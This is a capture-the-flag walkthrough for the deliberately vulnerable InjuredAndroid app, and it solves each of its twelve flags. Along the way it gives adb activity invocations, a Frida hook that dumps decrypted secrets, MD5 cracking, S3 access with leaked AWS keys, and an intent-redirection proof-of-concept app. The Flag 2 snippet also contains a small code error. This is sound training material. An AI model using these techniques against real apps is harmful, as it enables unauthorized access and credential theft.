## InjuredAndroid Walk-throughs

### Flag 1 - F1ag_0n3

Review source code and find the comparison string.

```java
if (post.equals("F1ag_0n3")) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagOneButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagOneButtonColor", true).commit();
            startActivity(intent);
        }
```

Submit the comparison string to score.

---

### Flag 2 - S3cond_F1ag

Invoke exported activity with adb or PoC app. (PoC app will help with later exercises)

```bash
adb shell am start -n b3nac.injuredandroid/.b25lActivity

```

```java
package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent start = new Intent();
        start.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.b25lActivity");
        startActivity(next);
    }

}

```

---

### Flag 3 - F1ag_thr33

Source code review based exercise. Trace resource reference to strings.xml.

```java

if (post.equals(getString(R.string.cmVzb3VyY2VzX3lv))) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagThreeButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagThreeButtonColor", true).commit();
            startActivity(intent);
        }

```

In strings.xml search for R.string.cmVzb3VyY2VzX3lv and submit the value as the flag.

`<string name="cmVzb3VyY2VzX3lv">F1ag_thr33</string>`

---

### Flag 4 - 4_overdone_omelets

Find where the bob variable is called from.

```java

String bob = new String(decoder.getData());

if (post.equals(bob)) {
            Intent intent = new Intent(this, FlagOneSuccess.class);
            FlagsOverview.flagFourButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagFourButtonColor", true).commit();
            startActivity(intent);
        }

```

Search the Decoder class for the base64 string and decode it or hook the method with frida.

```java

public class Decoder {
    byte [] data = Base64.decode("NF9vdmVyZG9uZV9vbWVsZXRz", Base64.DEFAULT);

    public byte[] getData() {
        return data;
    }
}

```

---

### Flag 5 - {F1V3!}

Iterate the broadcast by revisiting activity. After visiting the FlagFiveActivity three times the flag will be broadcasted.


```java

if (wtf == 0) {
            StringBuilder sb = new StringBuilder();
            sb.append("Action: " + intent.getAction() + "\n");
            sb.append("URI: " + intent.toUri(Intent.URI_INTENT_SCHEME) + "\n");
            String log = sb.toString();
            Log.d("DUDE!:", log);
            Toast.makeText(context, log, Toast.LENGTH_LONG).show();
            wtf = wtf + 1;
        }
        else if (wtf == 1) {
            String win = "Keep trying!";
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
            wtf = wtf + 1;
        }
        else if (wtf == 2) {

            String win = "You are a winner " + VGV4dEVuY3J5cHRpb25Ud28.decrypt("Zkdlt0WwtLQ=");
            FlagsOverview.flagFiveButtonColor = true;
            SharedPreferences.Editor editor = settings.edit();
            editor.putBoolean("flagFiveButtonColor", true).commit();
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
            
        }else{
            String win = "Keep trying!";
            Toast.makeText(context, win, Toast.LENGTH_LONG).show();
        }

```

---

### Flag 6 - {This_Isn't_Where_I_Parked_My_Car}

Use frida to hook the decryption method for the flag.

Python file "test.py" for Frida:

```python

import time
import frida

device = frida.get_usb_device()
pid = device.spawn(["b3nac.injuredandroid"])
device.resume(pid)
time.sleep(1)  # Without it Java.perform silently fails
session = device.attach(pid)
with open("test.js") as f:
    script = session.create_script(f.read())
script.load()

# prevent the python script from terminating
input()

```

Javascript file that is imported with python for Frida:

```javascript

console.log("Script loaded successfully ");
Java.perform(function x() {
    console.log("Inside java perform function");
    var my_class = Java.use("b3nac.injuredandroid.VGV4dEVuY3J5cHRpb25Ud28");
    
    var string_class = Java.use("java.lang.String");

    my_class.decrypt.overload("java.lang.String").implementation = function (x) { //hooking the new function
        console.log("*************************************")
        var my_string = string_class.$new("k3FElEG9lnoWbOateGhj5pX6QsXRNJKh///8Jxi8KXW7iDpk2xRxhQ==");
        console.log("Original arg: " + x);
        var ret = this.decrypt(my_string);
        console.log("Return value: " + ret);
        console.log("*************************************")
        return ret;
    };
    Java.choose("b3nac.injuredandroid", {
        onMatch: function (instance) {
            console.log("Found instance: " + instance);
            console.log("Result of secret func: " + instance.decrypt());
        },
        onComplete: function () { }

    });

});


```
---

### Flag 7 - S3V3N_11

Find the flag password in the sqlite database and the flag url in the Hide class. Enter both into the form for completion.  

Flag password first found as a MD5 hash `2ab96390c7dbe3439de74d0c9b0b1767` crack this value to get `hunter2`.

The flag url is in the Hide class rot47 encoded: https://injuredandroid.firebaseio.com/sqlite.json 

```java

private static String remoteUrl = "9EEADi^^:?;FC652?5C@:5]7:C632D6:@]4@>^DB=:E6];D@?";

```

---

### Flag 8 - C10ud_S3cur1ty_lol

Find the AWS bucket information in strings.xml and use disclosed aws id and aws secret to access s3 bucket with awscli.

Create AWS profile in `~/.aws/credentials`:

```bash

[injuredandroid]
aws_access_key_id = lookinstrings.xmlnotputtingitheresoawsdoesn'talert
aws_secret_access_key = lookinstrings.xmlnotputtingitheresoawsdoesn'talert


```

Then use this command:

```bash

aws s3 ls s3://injuredandroid --profile injuredandroid

```

---

### Flag 9 - [nine!_flag]

Find the flag by navigating to the firebase endpoint: `https://injuredandroid.firebaseio.com/flags.json`

```java

public class FlagNineFirebaseActivity extends AppCompatActivity {
    int click = 0;
    private static final String TAG = "FirebaseActivity";
    final String directory = "ZmxhZ3Mv";
    byte[] decodedDirectory = Base64.decode(directory, Base64.DEFAULT);
    final String refDirectory = new String(decodedDirectory, StandardCharsets.UTF_8);

```

Base64 decode the directory value: `final String directory = "ZmxhZ3Mv";`

Which gives you `flags/` which correlates to the endpoint being `flags.json` 

Base64 encode the flag from the response of `https://injuredandroid.firebaseio.com/flags.json` to score: W25pbmUhX2ZsYWdd

---

### Flag 10 - John@Gıthub.com

- Research "Github dotless i". 

- Authenticate using the b3nac.injuredandroid.QXV0aA activity by using an adb command to invoke the activity.

```bash
adb shell am start -n b3nac.injuredandroid/.QXV0aA

```

- Input email with dotless i after authenticating.

---

### Flag 11 - HIIMASTRING

- First invoke the activity with a deep link so you can access the post form. 

`adb shell am start -W -a android.intent.action.VIEW -d "flag11://"`

- Secondly find the binary in the apk and run strings on the golang binary or run the binary and the Golang binary will print the flag. 

Binary location is: `res/values/meŉu`

---

### Flag 12 - Flag complete after using an PoC apk

Complete the exploit by using a PoC app, an example from my Youtube video.

```java

package b3nac.injuredandroid.poc;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent next = new Intent();
        next.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.FlagTwelveProtectedActivity");
        next.putExtra("totally_secure", "https://google.com");

        Intent start = new Intent();
        start.setClassName("b3nac.injuredandroid", "b3nac.injuredandroid.ExportedProtectedIntent");
        start.putExtra("access_protected_component", next);

        startActivity(start);
    }

}

```

---


